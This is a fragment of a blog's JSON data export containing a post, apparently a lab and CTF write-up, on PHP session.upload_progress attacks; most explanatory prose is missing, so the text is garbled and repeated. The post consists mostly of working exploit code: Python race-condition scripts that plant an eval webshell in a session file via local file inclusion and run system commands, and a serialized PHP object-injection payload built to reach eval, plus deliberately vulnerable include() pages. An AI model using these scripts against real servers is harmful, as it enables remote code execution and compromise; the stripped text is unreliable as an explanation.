cookies={'PHPSESSID': sessid} )def read(session):    while True:        resp = session.post('http://127.0.0.1:5555/test56.php?file=session/sess_'+sessid,data=data)        if 'tgao.txt' in resp.text:            print(resp.text)            event.clear()        else:            print(\"[+++++++++++++]retry\")if __name__==\"__main__\":    event=threading.Event()    with requests.session() as session:        for i in xrange(1,30):             threading.Thread(target=write,args=(session,)).start()        for i in xrange(1,30):            threading.Thread(target=read,args=(session,)).start()    event.set()\n```\n\n\n\n![session.upload_progress](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145210.jpeg)\n\n### ctf\n\njustsoso,\n\n```auto\n<html>    <?php    error_reporting(0);    $file = $_GET[\"file\"];    $payload = $_GET[\"payload\"];    if(!isset($file)){        echo 'Missing parameter'.'<br>';    }    if(preg_match(\"/flag/\",$file)){        die('hack attacked!!!');    }    @include($file);    if(isset($payload)){        $url = parse_url($_SERVER['REQUEST_URI']);        parse_str($url['query'],$query);        foreach($query as $value){            if (preg_match(\"/flag/\",$value)) {                die('stop hacking!');                exit();            }        }        $payload = unserialize($payload);    }else{       echo \"Missing parameters\";    }    ?>    <!--Please test index.php?file=xxx.php -->    <!--Please get the source of hint.php-->    </html>\n```\n\n`$file`\n\n\n\n### \n\n****\n\n> 1\\. \n>\n> 2\\. session\n>\n> 3\\. session\n\n## session.upload\\_progress\n\n### \n\n> php5.5.38\n>\n> win10\n>\n> `session.serialize_handler=php_serialize`session\n\n### \n\n```auto\n<?phperror_reporting(0);date_default_timezone_set(\"Asia/Shanghai\");ini_set('session.serialize_handler','php');session_start();class Door{    public $handle;    function __construct() {        $this->handle=new TimeNow();    }    function __destruct() {        $this->handle->action();    }}class TimeNow {    function action() {        echo \":\".\"  \".date('Y-m-d H:i:s',time());    }}class  IP{    public $ip;    function __construct() {        $this->ip = 'echo $_SERVER[\"REMOTE_ADDR\"];';    }    function action() {        eval($this->ip);    }}?>\n```\n\n### \n\n****\n\n\n\n****\n\n`PHP_SESSION_UPLOAD_PROGRESS`session\n\n\n\n### \n\nexp.php\n\n```auto\n<?phpini_set('session.serialize_handler', 'php_serialize');session_start();class Door{    public $handle;    function __construct() {        $this->handle = new IP();    }    function __destruct() {        $this->handle->action();    }}class TimeNow {    function action() {        echo \":\".\"  \".date('Y-m-d H:i:s',time());    }}class  IP{    public $ip;    function __construct() {        //$this->ip='payload';        $this->ip='phpinfo();';        //$this->ip='print_r(scandir('/'));';    }    function action() {        eval($this->ip);    }}$a=new Door();$b=serialize($a);$c=addslashes($b);$d=str_replace(\"O:4:\",\"|O:4:\",$c);echo $d;?>\n```\n\nexp.py\n\n```auto\n#coding=utf-8import requestsimport threadingimport ioimport sysdef exp(ip,port):        f = io.BytesIO(b'a' * 1024 *1024*1)    while True:        et.wait()        url = 'http://'+ip+':'+str(port)+'/test5.php'        headers = {        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',        'DNT': '1',        'Cookie': 'PHPSESSID=20190506',        'Connection': 'close',        'Upgrade-Insecure-Requests': '1'        }        proxy = {        'http': '127.0.0.1:8080'        }        data={'PHP_SESSION_UPLOAD_PROGRESS':'123'}        files={            'file':(r'|O:4:\\\"Door\\\":1:{s:6:\\\"handle\\\";O:2:\\\"IP\\\":1:{s:2:\\\"ip\\\";s:10:\\\"phpinfo();\\\";}}',f,'text/plain')        }        resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) #,proxies=proxy        resp.encoding=\"utf-8\"        if len(resp.text)<2000:            print('[+++++]retry')        else:            print(resp.content.decode('utf-8').encode('utf-8'))            et.clear()            print('success!')            if __name__ == \"__main__\":    ip=sys.argv[1]    port=int(sys.argv[2])    et=threading.Event()    for i in xrange(1,40):        threading.Thread(target=exp,args=(ip,port)).start()    et.set()\n```\n\nburp\n\n![session.upload_progress](https://image.3001.net/images/20190506/1557146875_5cd02cfb01b9e.png!small)\n\n\n\n> PHPSESSID\n>\n> filename`|`,session`PHP_SESSION_UPLOAD_PROGRESS`\n>\n> `f = io.BytesIO(b'a' * 1024 *1024*1)`\n>\n> filename[python](https://blog.csdn.net/iriszx999/article/details/82113521)\n\n`exp.py``exp.py`,\n\n![session.upload_progress](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145729.jpeg)\n\n### \n\n> burp`exp.py`burpburp\n>\n> `PHP_SESSION_UPLOAD_PROGRESS``|`session\n\n### \n\nsession\n\n`PHP_SESSION_UPLOAD_PROGRESS`\n\n","source":"_posts/session.upload_progress .md","raw":"---\ntitle: session\ndate: 2023-02-13 23:31:54\nexcerpt: session\ncategories: \n---\n\n## \n\n**PHP`session.upload_progress`session**\n\n## phpsession.upload\\_progress\n\nphp5.4\n\nphp.ini\n\n```auto\n1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on3. session.upload_progress.prefix = \"upload_progress_\"4. session.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\"5. session.upload_progress.freq = \"1%\"6. session.upload_progress.min_freq = \"1\"\n```\n\n\n\n> `enabled=on``upload_progress`php()session \n>\n> `cleanup=on`phpsession\n>\n> `name`php\n>\n> `prefix+name`session\n\n## sessionsession\n\n\n\n> [https://www.cnblogs.com/iamstudy/articles/php\\_serialize\\_problem.html](https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html)\n>\n> [https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm\\_source=tuicool&utm\\_medium=referral](https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral)\n\nsession\n\n`session.use_strict_mode=off`offCookiesessionid\n\n## session.upload\\_progress\n\n### \n\n> php5.5.38\n>\n> win10\n>\n> session\n\n### \n\n```auto\n<?php$b=$_GET['file'];include \"$b\";?>\n```\n\n`session.upload_progress`sessionsessionsession\n\n### \n\n****\n\n`session_start()`,session\n\n****\n\n`session.auto_start=On` PHPSessionsession\\_start()\n\nsessionsession.use\\_strict\\_mode0Session IDCookiePHPSESSID=TGAOPHP/tmp/sess\\_TGAOSessionPHPSession ini.get(\"session.upload\\_progress.prefix\")+session.upload\\_progress.namesess\\_\n\n****\n\n`session.upload_progress.cleanup = on`session\n\n**rce**\n\n****\n\nsession\n\n### \n\n```auto\n#coding=utf-8import ioimport requestsimport threadingsessid = 'TGAO'data = {\"cmd\":\"system('whoami');\"}def write(session):    while True:        f = io.BytesIO(b'a' * 1024 * 50)        resp = session.post( 'http://127.0.0.1:5555/test56.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST[\"cmd\"]);?>'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )def read(session):    while True:        resp = session.post('http://127.0.0.1:5555/test56.php?file=session/sess_'+sessid,data=data)        if 'tgao.txt' in resp.text:            print(resp.text)            event.clear()        else:            print(\"[+++++++++++++]retry\")if __name__==\"__main__\":    event=threading.Event()    with requests.session() as session:        for i in xrange(1,30):             threading.Thread(target=write,args=(session,)).start()        for i in xrange(1,30):            threading.Thread(target=read,args=(session,)).start()    event.set()\n```\n\n\n\n![session.upload_progress](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145210.jpeg)\n\n### ctf\n\njustsoso,\n\n```auto\n<html>    <?php    error_reporting(0);    $file = $_GET[\"file\"];    $payload = $_GET[\"payload\"];    if(!isset($file)){        echo 'Missing parameter'.'<br>';    }    if(preg_match(\"/flag/\",$file)){        die('hack attacked!!!');    }    @include($file);    if(isset($payload)){        $url = parse_url($_SERVER['REQUEST_URI']);        parse_str($url['query'],$query);        foreach($query as $value){            if (preg_match(\"/flag/\",$value)) {                die('stop hacking!');                exit();            }        }        $payload = unserialize($payload);    }else{       echo \"Missing parameters\";    }    ?>    <!--Please test index.php?file=xxx.php -->    <!--Please get the source of hint.php-->    </html>\n```\n\n`$file`\n\n\n\n### \n\n****\n\n> 1\\. \n>\n> 2\\. session\n>\n> 3\\. session\n\n## session.upload\\_progress\n\n### \n\n> php5.5.38\n>\n> win10\n>\n> `session.serialize_handler=php_serialize`session\n\n### \n\n```auto\n<?phperror_reporting(0);date_default_timezone_set(\"Asia/Shanghai\");ini_set('session.serialize_handler','php');session_start();class Door{    public $handle;    function __construct() {        $this->handle=new TimeNow();    }    function __destruct() {        $this->handle->action();    }}class TimeNow {    function action() {        echo \":\".\"  \".date('Y-m-d H:i:s',time());    }}class  IP{    public $ip;    function __construct() {        $this->ip = 'echo $_SERVER[\"REMOTE_ADDR\"];';    }    function action() {        eval($this->ip);    }}?>\n```\n\n### \n\n****\n\n\n\n****\n\n`PHP_SESSION_UPLOAD_PROGRESS`session\n\n\n\n### \n\nexp.php\n\n```auto\n<?phpini_set('session.serialize_handler', 'php_serialize');session_start();class Door{    public $handle;    function __construct() {        $this->handle = new IP();    }    function __destruct() {        $this->handle->action();    }}class TimeNow {    function action() {        echo \":\".\"  \".date('Y-m-d H:i:s',time());    }}class  IP{    public $ip;    function __construct() {        //$this->ip='payload';        $this->ip='phpinfo();';        //$this->ip='print_r(scandir('/'));';    }    function action() {        eval($this->ip);    }}$a=new Door();$b=serialize($a);$c=addslashes($b);$d=str_replace(\"O:4:\",\"|O:4:\",$c);echo $d;?>\n```\n\nexp.py\n\n```auto\n#coding=utf-8import requestsimport threadingimport ioimport sysdef exp(ip,port):        f = io.BytesIO(b'a' * 1024 *1024*1)    while True:        et.wait()        url = 'http://'+ip+':'+str(port)+'/test5.php'        headers = {        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',        'DNT': '1',        'Cookie': 'PHPSESSID=20190506',        'Connection': 'close',        'Upgrade-Insecure-Requests': '1'        }        proxy = {        'http': '127.0.0.1:8080'        }        data={'PHP_SESSION_UPLOAD_PROGRESS':'123'}        files={            'file':(r'|O:4:\\\"Door\\\":1:{s:6:\\\"handle\\\";O:2:\\\"IP\\\":1:{s:2:\\\"ip\\\";s:10:\\\"phpinfo();\\\";}}',f,'text/plain')        }        resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) #,proxies=proxy        resp.encoding=\"utf-8\"        if len(resp.text)<2000:            print('[+++++]retry')        else:            print(resp.content.decode('utf-8').encode('utf-8'))            et.clear()            print('success!')            if __name__ == \"__main__\":    ip=sys.argv[1]    port=int(sys.argv[2])    et=threading.Event()    for i in xrange(1,40):        threading.Thread(target=exp,args=(ip,port)).start()    et.set()\n```\n\nburp\n\n![session.upload_progress](https://image.3001.net/images/20190506/1557146875_5cd02cfb01b9e.png!small)\n\n\n\n> PHPSESSID\n>\n> filename`|`,session`PHP_SESSION_UPLOAD_PROGRESS`\n>\n> `f = io.BytesIO(b'a' * 1024 *1024*1)`\n>\n> filename[python](https://blog.csdn.net/iriszx999/article/details/82113521)\n\n`exp.py``exp.py`,\n\n![session.upload_progress](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145729.jpeg)\n\n### \n\n> burp`exp.py`burpburp\n>\n> `PHP_SESSION_UPLOAD_PROGRESS``|`session\n\n### \n\nsession\n\n`PHP_SESSION_UPLOAD_PROGRESS`\n\n","slug":"session.upload_progress ","published":1,"updated":"2024-04-25T13:59:56.046Z","_id":"clvfb4qrg000166761rxu5ykz","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong>PHP<code>session.upload_progress</code>session</strong></p>\n<h2 id=\"phpsession-upload-progress\"><a href=\"#phpsession-upload-progress\" class=\"headerlink\" title=\"phpsession.upload_progress\"></a>phpsession.upload_progress</h2><p>php5.4</p>\n<p>php.ini</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on3. session.upload_progress.prefix = &quot;upload_progress_&quot;4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;5. session.upload_progress.freq = &quot;1%&quot;6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<blockquote>\n<p><code>enabled=on</code><code>upload_progress</code>php()session </p>\n<p><code>cleanup=on</code>phpsession</p>\n<p><code>name</code>php</p>\n<p><code>prefix+name</code>session</p>\n</blockquote>\n<h2 id=\"sessionsession\"><a href=\"#sessionsession\" class=\"headerlink\" title=\"sessionsession\"></a>sessionsession</h2><p></p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html\" >https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral\" >https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source&#x3D;tuicool&amp;utm_medium&#x3D;referral<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p>session</p>\n<p><code>session.use_strict_mode=off</code>offCookiesessionid</p>\n<h2 id=\"session-upload-progress\"><a href=\"#session-upload-progress\" class=\"headerlink\" title=\"session.upload_progress\"></a>session.upload_progress</h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><blockquote>\n<p>php5.5.38</p>\n<p>win10</p>\n<p>session</p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php$b=$_GET[&#x27;file&#x27;];include &quot;$b&quot;;?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>session.upload_progress</code>sessionsessionsession</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><strong></strong></p>\n<p><code>session_start()</code>,session</p>\n<p><strong></strong></p>\n<p><code>session.auto_start=On</code> PHPSessionsession_start()</p>\n<p>sessionsession.use_strict_mode0Session IDCookiePHPSESSID&#x3D;TGAOPHP&#x2F;tmp&#x2F;sess_TGAOSessionPHPSession ini.get(session.upload_progress.prefix)+session.upload_progress.namesess_</p>\n<p><strong></strong></p>\n<p><code>session.upload_progress.cleanup = on</code>session</p>\n<p><strong>rce</strong></p>\n<p><strong></strong></p>\n<p>session</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding=utf-8import ioimport requestsimport threadingsessid = &#x27;TGAO&#x27;data = &#123;&quot;cmd&quot;:&quot;system(&#x27;whoami&#x27;);&quot;&#125;def write(session):    while True:        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)        resp = session.post( &#x27;http://127.0.0.1:5555/test56.php&#x27;, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: (&#x27;tgao.txt&#x27;,f)&#125;, cookies=&#123;&#x27;PHPSESSID&#x27;: sessid&#125; )def read(session):    while True:        resp = session.post(&#x27;http://127.0.0.1:5555/test56.php?file=session/sess_&#x27;+sessid,data=data)        if &#x27;tgao.txt&#x27; in resp.text:            print(resp.text)            event.clear()        else:            print(&quot;[+++++++++++++]retry&quot;)if __name__==&quot;__main__&quot;:    event=threading.Event()    with requests.session() as session:        for i in xrange(1,30):             threading.Thread(target=write,args=(session,)).start()        for i in xrange(1,30):            threading.Thread(target=read,args=(session,)).start()    event.set()</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145210.jpeg\"\n                        alt=\"session.upload_progress\"\n                 ></p>\n<h3 id=\"ctf\"><a href=\"#ctf\" class=\"headerlink\" title=\"ctf\"></a>ctf</h3><p>justsoso,</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;    &lt;?php    error_reporting(0);    $file = $_GET[&quot;file&quot;];    $payload = $_GET[&quot;payload&quot;];    if(!isset($file))&#123;        echo &#x27;Missing parameter&#x27;.&#x27;&lt;br&gt;&#x27;;    &#125;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        die(&#x27;hack attacked!!!&#x27;);    &#125;    @include($file);    if(isset($payload))&#123;        $url = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]);        parse_str($url[&#x27;query&#x27;],$query);        foreach($query as $value)&#123;            if (preg_match(&quot;/flag/&quot;,$value)) &#123;                die(&#x27;stop hacking!&#x27;);                exit();            &#125;        &#125;        $payload = unserialize($payload);    &#125;else&#123;       echo &quot;Missing parameters&quot;;    &#125;    ?&gt;    &lt;!--Please test index.php?file=xxx.php --&gt;    &lt;!--Please get the source of hint.php--&gt;    &lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>$file</code></p>\n<p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><strong></strong></p>\n<blockquote>\n<p>1. </p>\n<p>2. session</p>\n<p>3. session</p>\n</blockquote>\n<h2 id=\"session-upload-progress\"><a href=\"#session-upload-progress\" class=\"headerlink\" title=\"session.upload_progress\"></a>session.upload_progress</h2><h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><blockquote>\n<p>php5.5.38</p>\n<p>win10</p>\n<p><code>session.serialize_handler=php_serialize</code>session</p>\n</blockquote>\n<h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?phperror_reporting(0);date_default_timezone_set(&quot;Asia/Shanghai&quot;);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();class Door&#123;    public $handle;    function __construct() &#123;        $this-&gt;handle=new TimeNow();    &#125;    function __destruct() &#123;        $this-&gt;handle-&gt;action();    &#125;&#125;class TimeNow &#123;    function action() &#123;        echo &quot;:&quot;.&quot;  &quot;.date(&#x27;Y-m-d H:i:s&#x27;,time());    &#125;&#125;class  IP&#123;    public $ip;    function __construct() &#123;        $this-&gt;ip = &#x27;echo $_SERVER[&quot;REMOTE_ADDR&quot;];&#x27;;    &#125;    function action() &#123;        eval($this-&gt;ip);    &#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><p><strong></strong></p>\n<p></p>\n<p><strong></strong></p>\n<p><code>PHP_SESSION_UPLOAD_PROGRESS</code>session</p>\n<p></p>\n<h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><p>exp.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();class Door&#123;    public $handle;    function __construct() &#123;        $this-&gt;handle = new IP();    &#125;    function __destruct() &#123;        $this-&gt;handle-&gt;action();    &#125;&#125;class TimeNow &#123;    function action() &#123;        echo &quot;:&quot;.&quot;  &quot;.date(&#x27;Y-m-d H:i:s&#x27;,time());    &#125;&#125;class  IP&#123;    public $ip;    function __construct() &#123;        //$this-&gt;ip=&#x27;payload&#x27;;        $this-&gt;ip=&#x27;phpinfo();&#x27;;        //$this-&gt;ip=&#x27;print_r(scandir(&#x27;/&#x27;));&#x27;;    &#125;    function action() &#123;        eval($this-&gt;ip);    &#125;&#125;$a=new Door();$b=serialize($a);$c=addslashes($b);$d=str_replace(&quot;O:4:&quot;,&quot;|O:4:&quot;,$c);echo $d;?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>exp.py</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding=utf-8import requestsimport threadingimport ioimport sysdef exp(ip,port):        f = io.BytesIO(b&#x27;a&#x27; * 1024 *1024*1)    while True:        et.wait()        url = &#x27;http://&#x27;+ip+&#x27;:&#x27;+str(port)+&#x27;/test5.php&#x27;        headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;,        &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,        &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#x27;,        &#x27;DNT&#x27;: &#x27;1&#x27;,        &#x27;Cookie&#x27;: &#x27;PHPSESSID=20190506&#x27;,        &#x27;Connection&#x27;: &#x27;close&#x27;,        &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;        &#125;        proxy = &#123;        &#x27;http&#x27;: &#x27;127.0.0.1:8080&#x27;        &#125;        data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;123&#x27;&#125;        files=&#123;            &#x27;file&#x27;:(r&#x27;|O:4:\\&quot;Door\\&quot;:1:&#123;s:6:\\&quot;handle\\&quot;;O:2:\\&quot;IP\\&quot;:1:&#123;s:2:\\&quot;ip\\&quot;;s:10:\\&quot;phpinfo();\\&quot;;&#125;&#125;&#x27;,f,&#x27;text/plain&#x27;)        &#125;        resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) #,proxies=proxy        resp.encoding=&quot;utf-8&quot;        if len(resp.text)&lt;2000:            print(&#x27;[+++++]retry&#x27;)        else:            print(resp.content.decode(&#x27;utf-8&#x27;).encode(&#x27;utf-8&#x27;))            et.clear()            print(&#x27;success!&#x27;)            if __name__ == &quot;__main__&quot;:    ip=sys.argv[1]    port=int(sys.argv[2])    et=threading.Event()    for i in xrange(1,40):        threading.Thread(target=exp,args=(ip,port)).start()    et.set()</span><br></pre></td></tr></table></figure>\n\n<p>burp</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20190506/1557146875_5cd02cfb01b9e.png!small\"\n                        alt=\"session.upload_progress\"\n                 ></p>\n<p></p>\n<blockquote>\n<p>PHPSESSID</p>\n<p>filename<code>|</code>,session<code>PHP_SESSION_UPLOAD_PROGRESS</code></p>\n<p><code>f = io.BytesIO(b&#39;a&#39; * 1024 *1024*1)</code></p>\n<p>filename<a class=\"link\"   href=\"https://blog.csdn.net/iriszx999/article/details/82113521\" >python<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p><code>exp.py</code><code>exp.py</code>,</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252145729.jpeg\"\n                        alt=\"session.upload_progress\"\n                 ></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><blockquote>\n<p>burp<code>exp.py</code>burpburp</p>\n<p><code>PHP_SESSION_UPLOAD_PROGRESS</code><code>|</code>session</p>\n</blockquote>\n<h3 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h3><p>session</p>\n<p><code>PHP_SESSION_UPLOAD_PROGRESS</code></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]},"cdn":{"enable":true,"provider":"jsdelivr"}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong>PHP<code>session.upload_progress</code>session</strong></p>\n<h2 id=\"phpsession-upload-progress\"><a href=\"#phpsession-upload-progress\" class=\"headerlink\" title=\"phpsession.upload_progress\"></a>phpsession.upload_progress</h2><p>php5.4</p>\n<p>php.ini</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on3. session.upload_progress.prefix = &quot;upload_progress_&quot;4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;5. session.upload_progress.freq = &quot;1%&quot;6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<blockquote>\n<p><code>enabled=on</code><code>upload_progress</code>php()session </p>\n<p><code>cleanup=on</code>phpsession</p>\n<p><code>name</code>php</p>\n<p><code>prefix+name</code>session</p>\n</blockquote>\n<h2 id=\"sessionsession\"><a href=\"#sessionsession\" class=\"headerlink\" title=\"sessionsession\"></a>sessionsession</h2><p></p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html\" >https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&utm_medium=referral\" >https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source&#x3D;tuicool&amp;utm_medium&#x3D;referral<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p>session</p>\n<p><code>session.use_strict_mode=off</code>offCookiesessionid</p>\n<h2 id=\"session-upload-progress\"><a href=\"#session-upload-progress\" class=\"headerlink\" title=\"session.upload_progress\"></a>session.upload_progress</h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><blockquote>\n<p>php5.5.38</p>\n<p>win10</p>\n<p>session</p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php$b=$_GET[&#x27;file&#x27;];include &quot;$b&quot;;?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>session.upload_progress</code>sessionsessionsession</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><strong></strong></p>\n<p><code>session_start()</code>,session</p>\n<p><strong></strong></p>\n<p><code>session.auto_start=On</code> PHPSessionsession_start()</p>\n<p>sessionsession.use_strict_mode0Session IDCookiePHPSESSID&#x3D;TGAOPHP&#x2F;tmp&#x2F;sess_TGAOSessionPHPSession ini.get(session.upload_progress.prefix)+session.upload_progress.namesess_</p>\n<p><strong></strong></p>\n<p><code>session.upload_progress.cleanup = on</code>session</p>\n<p><strong>rce</strong></p>\n<p><strong></strong></p>\n<p>session</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding=utf-8import ioimport requestsimport threadingsessid = &#x27;TGAO&#x27;data = &#123;&quot;cmd&quot;:&quot;system(&#x27;whoami&#x27;);&quot;&#125;def write(session):    while True:        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)        resp = session.post( &#x27;http://127.0.0.1:5555/test56.php&#x27;, data=&#123;&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;&#125;, files=&#123;&#x27;file&#x27;: 